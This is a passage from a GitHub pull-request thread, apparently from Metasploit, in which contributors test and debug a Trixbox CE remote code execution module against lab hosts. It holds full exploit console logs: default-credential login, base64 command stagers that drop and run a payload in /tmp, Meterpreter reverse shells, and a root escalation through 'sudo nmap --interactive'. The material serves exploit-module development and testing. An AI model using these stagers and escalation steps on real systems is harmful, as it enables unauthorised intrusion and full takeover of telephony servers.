	<br> 		<br> 		<br> 		<br> 		<br> 		<br>		 		</div>  	   </td> 	  </tr> 	 </table> 	</td>    </tr>  </table> </td> <!-- End Display center blocks -->  					</tr> 					<tr> 						<td colspan="3">&nbsp; </td> 					</tr> 				</table> 				</td> 			</tr> 		</table> 		<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0"> 			<tr> 				<td width="21"><img src="images/bot_cat_left.gif" border="0" /></td> 				<td align="middle" width="100%" background="images/bot_cat_bg.gif"> 				</td> 				<td width="21"><img src="images/bot_cat_right.gif" border="0" /></td> 			</tr> 		</table> 		</td> 	</tr> </table> <table width="758" border="0" align="center" cellpadding="0" cellspacing="0" class="dole"> 	<tr> 		<td> 		<div class="privatnost"> 			<br /> 			Copyright &copy 2006 by 			<a href="http://www.trixbox.org" target="_self">trixbox.org</a> 			<br /> 			<br /> 		</div> 		</td> 	</tr> </table>  </body>  </html> [+] 192.168.205.146:80 - Authenticated successfully. [+] 192.168.205.146:80 - Trixbox CE v.x identified. [-] Exploit aborted due to failure: not-vulnerable: The target is not vulnerable [*] Exploit completed, but no session was created. msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) >   ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [May 4, 2020](#issuecomment-623243963) • edited Loading

| I figured out why TrixBox CE 2.0 is failing. Turns out, at least on my install, this server takes several seconds to respond and is much slower than most other installs. This is causing the login request to time out so when exploiting the target, a response is never received in time. I would recommend increasing the timeout by several seconds to allow not only for the fact that this build is slower, but also to allow for the overhead that any slow connections might impose. |
| --- |

All reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [May 4, 2020](#issuecomment-623247809)

| TrixBox v1.0: Not correctly identifying the version:  ``` msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set RHOST 192.168.205.144 RHOST => 192.168.205.144 msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.144:80 - Authenticating using "maint:password" credentials... #################### # Request: #################### GET /maint/ HTTP/1.1 Host: 192.168.205.144 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Authorization: Basic bWFpbnQ6cGFzc3dvcmQ= Content-Type: application/x-www-form-urlencoded   #################### # Response: #################### HTTP/1.1 200 OK Date: Thu, 30 Apr 2020 19:19:52 GMT Server: Apache/2.0.52 (CentOS) X-Powered-By: PHP/4.3.9 Content-Length: 5034 Connection: close Content-Type: text/html; charset=UTF-8  <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">  <head> <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1" /> <meta http-equiv="content-language" content="en" /> <title>trixbox - Configuration and Administration</title> <link href="favicon.ico" rel="SHORTCUT ICON" /> <link rel="stylesheet" type="text/css" media="all" href="include/css/styleNN.css" /> <!-- RMV: added module header --> </head>  <body>  <table border="0" align="center" cellpadding="0" cellspacing="0" class="okvir_main"> 	<tr> 		<td> 		<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0"> 			<tr> 				<td width="21"><img src="images/top_tab_left.gif" border="0" /></td> 				<td align="middle" width="100%" background="images/top_tab_bg.gif"> 				</td> 				<td width="21"><img src="images/top_tab_right.gif" border="0" /></td> 			</tr> 		</table> 		<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" id="okvir"> 			<tr> 				<td> 				<table width="100%" cellspacing="0"> 					<tr id="header"> 						<td> 						<img src="images/blank.gif" width="35" height="10" /></td> 						<td id="headerlogo" height="65px"> 						<a href="http://www.trixbox.org"> 						<img src="images/logo.png" width="212" height="55" alt="trixbox" border="0" /></a></td> 						<td align="right" id="headerbanner">Configuration and Administration&nbsp;&nbsp;&nbsp; 						</td> 					    <td id="headerlogo"><img src="images/gears.png" width="64" height="64" alt="Configuration and Administration" border="0" /></td> 					</tr> 					<tr> 						<td colspan="4"> 						<table cellspacing="0" cellpadding="0" width="100%" border="0"> 							<tr align="center"> 								<td width="588" bgcolor="#004081"></td> 								<td id="headmenu"> 								<a class="menuHead" href="index.php">MAIN</a></td> 								<td width="1" bgcolor="#d7d7d7"></td> 								<td id="headmenu"> 								<a class="menuHead" href="about.php">ABOUT</a></td> 								<td width="1" bgcolor="#d7d7d7"></td> 							</tr> 						</table> 						</td> 					</tr> 				</table> 				<table width="100%" border="0" cellspacing="0" cellpadding="0"> 					<tr> 						<td> 						<table width="100%" border="0" cellspacing="0" cellpadding="0"> 							<tr>								 							    <td align="left" class="vrijeme">Version: 1.0 	 								&nbsp;</td>  								<td align="right" class="vrijeme"> 								<span id="clock"></span> 								<script language="JavaScript" type="text/javascript" src="include/clock.js"></script> 								&nbsp;</td> 							</tr> 						</table> 						</td> 					</tr> 				</table> 				<table border="0" cellpadding="0" cellspacing="0" id="glavna"> 					<tr> 						<td id="leftcolumn"> 						<!-- Start left blocks loop --> 						<div class="blockTitle">Asterisk</div> 						<div class="blockContent"> 							<table cellspacing="0"> 								<tr><td id="mainmenu"> 									<a class="menuTop" href="/admin" target="_blank">FreePBX</a> 									<a class="menuTop" href="configedit/phpconfig.php" target="_blank">Config Edit</a> 									<a class="menuTop" href="endpointcfg.php">Endpoint Manager</a> 									<a class="menuTop" href="hudadmin.php">HUD Manager</a> 								</td></tr> 							</table> 						</div> 						<div class="blockTitle">System</div> 						<div class="blockContent"> 							<table cellspacing="0"> 								<tr><td id="mainmenu"> 									<a class="menuTop" href="phpMyAdmin" target="_blank">phpMyAdmin</a> 									<a class="menuTop" href="phpsysinfo" target="_blank">System Info</a> 									<a class="menuTop" href="sysmaint.php">System Maint</a> 									<a class="menuTop" href="javassh.php">SSH Terminal</a> 								</td></tr> 							</table> 						</div> 						<img src="images/160.gif" width="160" height="1" alt="" /> 						<!-- End left blocks loop --><br /> 						<br /> 						</td><td id="centercolumn"> 	<div id="content"> 		<div class="blockTitle">Main Menu</div> 		<div class="blockContent"> Welcome to trixbox  		</div> 	</div> <br /> <br /> <br /> </td>  					</tr> 					<tr> 						<td colspan="3">&nbsp; </td> 					</tr> 				</table> 				</td> 			</tr> 		</table> 		<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0"> 			<tr> 				<td width="21"><img src="images/bot_cat_left.gif" border="0" /></td> 				<td align="middle" width="100%" background="images/bot_cat_bg.gif"> 				</td> 				<td width="21"><img src="images/bot_cat_right.gif" border="0" /></td> 			</tr> 		</table> 		</td> 	</tr> </table> <table width="758" border="0" align="center" cellpadding="0" cellspacing="0" class="dole"> 	<tr> 		<td> 		<div class="privatnost"> 			<br /> 			Copyright &copy 2006 by 			<a href="http://www.trixbox.org" target="_self">trixbox.org</a> 			<br /> 			<br /> 		</div> 		</td> 	</tr> </table>  </body>  </html> [+] 192.168.205.144:80 - Authenticated successfully. [+] 192.168.205.144:80 - Trixbox CE v.x identified. [-] Exploit aborted due to failure: not-vulnerable: The target is not vulnerable [*] Exploit completed, but no session was created. msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) >   ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [May 4, 2020](#issuecomment-623250289) • edited Loading

| [@stasinopoulos](https://github.com/stasinopoulos) Here is an updated regex that will fix the regex you have at the moment in your code and will update the output to be better:  ``` version = res.body.scan(/Version: (\d.\d.{0,1}\d{0,1})/).flatten.first print_good("#{peer} - Trixbox CE #{version} identified.")  ```  If I run this against TrixBox CE 1.1, the output is now a lot more obvious:  ``` msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.147:80 - Authenticating using "maint:password" credentials... [+] 192.168.205.147:80 - Authenticated successfully. [+] 192.168.205.147:80 - Trixbox CE 1.1.0 identified. [-] Exploit aborted due to failure: not-vulnerable: The target is not vulnerable [*] Exploit completed, but no session was created. msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) >   ```  Targeting TrixBox 2.4.2.0, this output becomes somewhat less reliable...  ``` msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.150:80 - Authenticating using "maint:password" credentials... [+] 192.168.205.150:80 - Authenticated successfully. [+] 192.168.205.150:80 - Trixbox CE 2.0.0 identified. [*] 192.168.205.150:80 - Sending payload (150 bytes)... [*] Generated command stager: ["echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjqAAAAgAEAAAcAAAAAEAAAvUbnnCTb19l0JPRYMcmxH4PABDFoEQNoEeKzjZZ6ColQYT9uzAy9wJRZIO3ZzfmGGVkwV/KYykleFCsDOH77hZP3GmbRiFmpkJEvXl7KDZ6gCgn1oGCsgEJFZ18EI7cZuMcQaMWuXpzK0Nd/Czvrvm+wQz29SSZ+RVpz9lfDMWIo9/jzzTh69jJZwvfMmjJDzZoyswMa>>'/tmp/OQykC.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/RBUGF' < '/tmp/OQykC.b64' ; chmod +x '/tmp/RBUGF' ; '/tmp/RBUGF' ; rm -f '/tmp/RBUGF' ; rm -f '/tmp/OQykC.b64'"] [*] Transmitting intermediate stager...(106 bytes) [*] Sending stage (980808 bytes) to 192.168.205.150 [*] Meterpreter session 4 opened (192.168.205.1:4444 -> 192.168.205.150:60710) at 2020-05-03 23:27:00 -0500 [*] Command Stager progress - 100.00% done (799/799 bytes)  meterpreter > id [-] Unknown command: id. meterpreter > getuid Server username: no-user @ trixbox1.localdomain (uid=102, gid=103, euid=102, egid=103) meterpreter > exit [*] Shutting down Meterpreter...  [*] 192.168.205.150 - Meterpreter session 4 closed.  Reason: User exit  ```  Looking at the code for later versions I can see that your regex would work better. What I propose is perhaps combing both together:  ``` version = res.body.scan(/v(\d.\d.{0,1}\d{0,1})/).flatten.first     if version.nil?       version = res.body.scan(/Version: (\d.\d.{0,1}\d{0,1})/).flatten.first       if version.nil?         print_error("Unable to grab version of Trixbox installed on target!")         return nil        end     end  ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@wvu](https://avatars.githubusercontent.com/u/4551878?s=80&u=99426fa1baf3d6e40a669942251d846cf81a9c25&v=4)](/wvu)

Copy link

Contributor

### **[wvu](/wvu)** commented [May 4, 2020](#issuecomment-623254091)

| ``` Server username: no-user  ```  I am so fixing that this week. |
| --- |

 👍
1
 gwillcox-r7 reacted with thumbs up emoji
 ❤️
1
 stasinopoulos reacted with heart emoji

All reactions

* 👍
  1 reaction
* ❤️
  1 reaction

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [May 4, 2020](#issuecomment-623255723) • edited Loading

| Okay with this regex:  ``` version = res.body.scan(/v(\d.\d.{0,1}\d{0,1})/).flatten.first     if version.nil?       version = res.body.scan(/Version: (\d.\d.{0,1}\d{0,1})/).flatten.first       if version.nil?         print_error("Unable to grab version of Trixbox installed on target!")         return nil        end     end  ```  We get some nice results at long last:  ``` msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.150:80 - Authenticating using "maint:password" credentials... [+] 192.168.205.150:80 - Authenticated successfully. [+] 192.168.205.150:80 - Trixbox CE 2.4.0 identified. [*] 192.168.205.150:80 - Sending payload (150 bytes)... [*] Generated command stager: ["echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjqAAAAgAEAAAcAAAAAEAAAunbrcPna2dl0JPRfK8mxHzFXFYPHBANXEeKDgXqnWo2MtM9yIFHtxKAsEOmtuImabW7gWgZt+k2K+BsHVKOLic/aymk9XImuxETfWgoffaJ039nJdLXchJZ4F1vY/mcdZOtAbJFVjoCepQdDX04bRYOdkziJHlYCaQ8DCmu2AWbcyqj3mQ1K+l5sEvugb2JHoW9it2/v>>'/tmp/VuDji.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/LLWIJ' < '/tmp/VuDji.b64' ; chmod +x '/tmp/LLWIJ' ; '/tmp/LLWIJ' ; rm -f '/tmp/LLWIJ' ; rm -f '/tmp/VuDji.b64'"] [*] Transmitting intermediate stager...(106 bytes) [*] Sending stage (980808 bytes) to 192.168.205.150 [*] Meterpreter session 9 opened (192.168.205.1:4444 -> 192.168.205.150:60303) at 2020-05-03 23:47:06 -0500 [*] Command Stager progress - 100.00% done (799/799 bytes)  meterpreter > exit [*] Shutting down Meterpreter...  [*] 192.168.205.150 - Meterpreter session 9 closed.  Reason: User exit msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set RHOSTS 192.168.205.144 RHOSTS => 192.168.205.144 msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.144:80 - Authenticating using "maint:password" credentials... [+] 192.168.205.144:80 - Authenticated successfully.  identified.205.144:80 - Trixbox CE 1.0 [-] Exploit aborted due to failure: not-vulnerable: The target is not vulnerable [*] Exploit completed, but no session was created. msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set RHOSTS 192.168.205.146 RHOSTS => 192.168.205.146 msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.146:80 - Authenticating using "maint:password" credentials... [+] 192.168.205.146:80 - Authenticated successfully. [+] 192.168.205.146:80 - Trixbox CE 1.2.3 identified. [-] Exploit aborted due to failure: not-vulnerable: The target is not vulnerable [*] Exploit completed, but no session was created. msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) >   ```  Version info is now finally more accurate 🥳Still need to work on why its detecting Trixbox CE 1.2.3 as not vulnerable though. |
| --- |

 ❤️
2
 wvu and stasinopoulos reacted with heart emoji

All reactions

* ❤️
  2 reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [May 4, 2020](#issuecomment-623257765) • edited Loading

| Ah so found out why it wasn't detecting that version. Your last check was waaaaaaaaaaay too specific. Here is what is was before:  ``` elsif Gem::Version.new(version) == Gem::Version.new('1.2')  ```  And here is the new version:  ``` elsif Gem::Version.new(version).between?(Gem::Version.new('1.2'), Gem::Version.new('1.9'))       @uri = normalize_uri(target_uri.path, '/maint/endpoint_devicemap.php')  ```  Lesson here: **Don't do checks specifically on a one branches's release number. There are typically multiple releases within a branch or within one major.minor release**.  Edit here is the code working now with these updates:  ``` msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.146:80 - Authenticating using "maint:password" credentials... [+] 192.168.205.146:80 - Authenticated successfully. [+] 192.168.205.146:80 - Trixbox CE 1.2.3 identified. [*] 192.168.205.146:80 - Sending payload (150 bytes)... [*] Generated command stager: ["echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjqAAAAgAEAAAcAAAAAEAAAu8WPOqja3tl0JPRYMcmxHzFYFQNYFYPo/OIw5TD2iyGz5biWb4A8qfbdoQR2Snr/t92x/l8cSRD8qah4mvF6LDWLm410C97S/hWupj1OjEc+jogtPuQtO93J5PairzZxHkSRMGci3SRoVFSnqb9q6clMwpTAzaeno938rrVHsNuFe3mbY7v5npTdQZ9qHrEbax6xW6Ge>>'/tmp/FrZkS.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/xkjQL' < '/tmp/FrZkS.b64' ; chmod +x '/tmp/xkjQL' ; '/tmp/xkjQL' ; rm -f '/tmp/xkjQL' ; rm -f '/tmp/FrZkS.b64'"] [*] Transmitting intermediate stager...(106 bytes) [*] Sending stage (980808 bytes) to 192.168.205.146 [*] Meterpreter session 10 opened (192.168.205.1:4444 -> 192.168.205.146:32775) at 2020-05-03 23:57:12 -0500 [*] Command Stager progress - 100.00% done (799/799 bytes)  meterpreter >   ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [May 4, 2020](#issuecomment-623264321)

| [@stasinopoulos](https://github.com/stasinopoulos) Okay with updates this is what things look like atm:  ``` msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.144:80 - Authenticating using "maint:password" credentials... [+] 192.168.205.144:80 - Authenticated successfully.  identified.205.144:80 - Trixbox CE 1.0 [-] Exploit aborted due to failure: not-vulnerable: The target is not vulnerable [*] Exploit completed, but no session was created. msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set RHOSTS 192.168.205.147 RHOSTS => 192.168.205.147 msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.147:80 - Authenticating using "maint:password" credentials... [+] 192.168.205.147:80 - Authenticated successfully. [+] 192.168.205.147:80 - Trixbox CE 1.1.0 identified. [-] Exploit aborted due to failure: not-vulnerable: The target is not vulnerable [*] Exploit completed, but no session was created. msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set RHOSTS 192.168.205.148 RHOSTS => 192.168.205.148 msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.148:80 - Authenticating using "maint:password" credentials... [+] 192.168.205.148:80 - Authenticated successfully. [+] 192.168.205.148:80 - Trixbox CE 1.2.0 identified. [*] 192.168.205.148:80 - Sending payload (150 bytes)... [*] Generated command stager: ["echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjqAAAAgAEAAAcAAAAAEAAA2eXZdCT0XzHJsR+9FTcPCzFvGoPHBANvFuLgXQVVO3nuimg+QieMcAI+cb1L1ypWjHABp2SDmbkoCnjTtlQqdWDsKzZDbi55InZ+Dujg3O4S8XiFEpt90PBqtC92CYbJyvkhmDJHLcw8t6QP/Vy6Dh2ucu0vL/fOyCCsR8nY4DK62MlDPx6pQb9+8Uc/gQHzPoEBA4wB>>'/tmp/JjFxk.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/IsRTn' < '/tmp/JjFxk.b64' ; chmod +x '/tmp/IsRTn' ; '/tmp/IsRTn' ; rm -f '/tmp/IsRTn' ; rm -f '/tmp/JjFxk.b64'"] [*] Transmitting intermediate stager...(106 bytes) [*] Sending stage (980808 bytes) to 192.168.205.148 [*] Meterpreter session 11 opened (192.168.205.1:4444 -> 192.168.205.148:32774) at 2020-05-04 00:18:06 -0500 [*] 192.168.205.146 - Meterpreter session 10 closed.  Reason: Died [*] Command Stager progress - 100.00% done (799/799 bytes)  meterpreter > exit [*] Shutting down Meterpreter...  [*] 192.168.205.148 - Meterpreter session 11 closed.  Reason: User exit msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set RHOSTS 192.168.205.145 RHOSTS => 192.168.205.145 msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.145:80 - Authenticating using "maint:password" credentials... [-] Exploit aborted due to failure: unreachable: Connection failed. [*] Exploit completed, but no session was created. msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set RHOSTS 192.168.205.150 RHOSTS => 192.168.205.150 msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.150:80 - Authenticating using "maint:password" credentials... [+] 192.168.205.150:80 - Authenticated successfully. [+] 192.168.205.150:80 - Trixbox CE 2.4.0 identified. [*] 192.168.205.150:80 - Sending payload (150 bytes)... [*] Generated command stager: ["echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjqAAAAgAEAAAcAAAAAEAAAvhcSgina0tl0JPRYMcmxHzFwFYPo/ANwEeLieIh3PaZ7ZG4b1wGSK7Fcc4a+yChxf14DgBedm5K7KHr+JXMsrv4KLRPMjShUt5R8IXXPIsmFD3qghWV/vWVItnDpLojyV9svt6+lL6ev1aYkbj60a5LNdBaYTvEpWl+iIHrG5lnN+sseqD2rHExc8yCynwOYs58D3n4f>>'/tmp/pSjqF.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/FPEAL' < '/tmp/pSjqF.b64' ; chmod +x '/tmp/FPEAL' ; '/tmp/FPEAL' ; rm -f '/tmp/FPEAL' ; rm -f '/tmp/pSjqF.b64'"] [*] Transmitting intermediate stager...(106 bytes) [*] Sending stage (980808 bytes) to 192.168.205.150 [*] Meterpreter session 12 opened (192.168.205.1:4444 -> 192.168.205.150:47103) at 2020-05-04 00:22:02 -0500 [*] Command Stager progress - 100.00% done (799/799 bytes)  meterpreter > exit [*] Shutting down Meterpreter...  [*] 192.168.205.150 - Meterpreter session 12 closed.  Reason: User exit msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) >   ```  The timeout is on TrixBox CE 2.0 due to delays on the host, again just need that timeout update. Same with TrixBox CE 2.2.12. |
| --- |

All reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [May 4, 2020](#issuecomment-623265927)

| Well I guess when the timeout doesn't happen, CE 2.2.1 is actually pretty good:  ``` msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set VERBOSE false VERBOSE => false msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.151:80 - Authenticating using "maint:password" credentials... [+] 192.168.205.151:80 - Authenticated successfully. [+] 192.168.205.151:80 - Trixbox CE 2.2.1 identified. [*] 192.168.205.151:80 - Sending payload (150 bytes)... [*] Sending stage (980808 bytes) to 192.168.205.151 [*] Meterpreter session 13 opened (192.168.205.1:4444 -> 192.168.205.151:32771) at 2020-05-04 00:32:43 -0500 [*] Command Stager progress - 100.00% done (799/799 bytes)  meterpreter > getuid Server username: no-user @ asterisk1.local (uid=100, gid=101, euid=100, egid=101) meterpreter > shell Process 4082 created. Channel 1 created. pwd /var/www/html/maint/modules/11_endpointcfg whoami asterisk id uid=100(asterisk) gid=101(asterisk) groups=101(asterisk) sudo nmap --interactive  Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ ) Welcome to Interactive Mode -- press h <enter> for help nmap> !sh whoami root  ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [May 4, 2020](#issuecomment-623276623) • edited Loading

| TrixBox CE 2.6.2.2 seems to work well with updates:  ``` msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.152:80 - Authenticating using "maint:password" credentials... [+] 192.168.205.152:80 - Authenticated successfully. [+] 192.168.205.152:80 - Trixbox CE 2.6.2 identified. [*] 192.168.205.152:80 - Sending payload (150 bytes)... [*] Sending stage (980808 bytes) to 192.168.205.152 [*] Meterpreter session 14 opened (192.168.205.1:4444 -> 192.168.205.152:42177) at 2020-05-04 01:08:56 -0500  [*] Command Stager progress - 100.00% done (799/799 bytes)  meterpreter >  meterpreter > getuid Server username: no-user @ trixbox1.localdomain (uid=100, gid=101, euid=100, egid=101) meterpreter > shell Process 3616 created. Channel 1 created. id uid=100(asterisk) gid=101(asterisk) groups=101(asterisk) whoami asterisk pwd /var/www/html/maint/modules/endpointcfg  ```  And here is TrixBox 2.8.0.4:  ``` msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.153:80 - Authenticating using "maint:password" credentials... [+] 192.168.205.153:80 - Authenticated successfully. [+] 192.168.205.153:80 - Trixbox CE 2.8.0 identified. [*] 192.168.205.153:80 - Sending payload (150 bytes)... [*] Sending stage (980808 bytes) to 192.168.205.153 [*] Meterpreter session 15 opened (192.168.205.1:4444 -> 192.168.205.153:59912) at 2020-05-04 01:10:25 -0500 [*] Command Stager progress - 100.00% done (799/799 bytes)  meterpreter >   ```  Looks like I might need to update the regex to catch one more potential period and number. Will attempt this tomorrow as initial attempts show that `check` method might need more edits from me. |
| --- |

All reactions

Sorry, something went wrong.

[![@stasinopoulos](https://avatars.githubusercontent.com/u/5289251?s=80&u=88dc2df1857e6c8926dcbfc8048901d4ade830cf&v=4)](/stasinopoulos)

Copy link

Contributor

Author

### **[stasinopoulos](/stasinopoulos)** commented [May 4, 2020](#issuecomment-623329882)

| [@stasinopoulos](https://github.com/stasinopoulos) Here is an updated regex that will fix the regex you have at the moment in your code and will update the output to be better:  ``` version = res.body.scan(/Version: (\d.\d.{0,1}\d{0,1})/).flatten.first print_good("#{peer} - Trixbox CE #{version} identified.")  ```  If I run this against TrixBox CE 1.1, the output is now a lot more obvious:  ``` msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.147:80 - Authenticating using "maint:password" credentials... [+] 192.168.205.147:80 - Authenticated successfully. [+] 192.168.205.147:80 - Trixbox CE 1.1.0 identified. [-] Exploit aborted due to failure: not-vulnerable: The target is not vulnerable [*] Exploit completed, but no session was created. msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) >   ```  Targeting TrixBox 2.4.2.0, this output becomes somewhat less reliable...  ``` msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.150:80 - Authenticating using "maint:password" credentials... [+] 192.168.205.150:80 - Authenticated successfully. [+] 192.168.205.150:80 - Trixbox CE 2.0.0 identified. [*] 192.168.205.150:80 - Sending payload (150 bytes)... [*] Generated command stager: ["echo -n 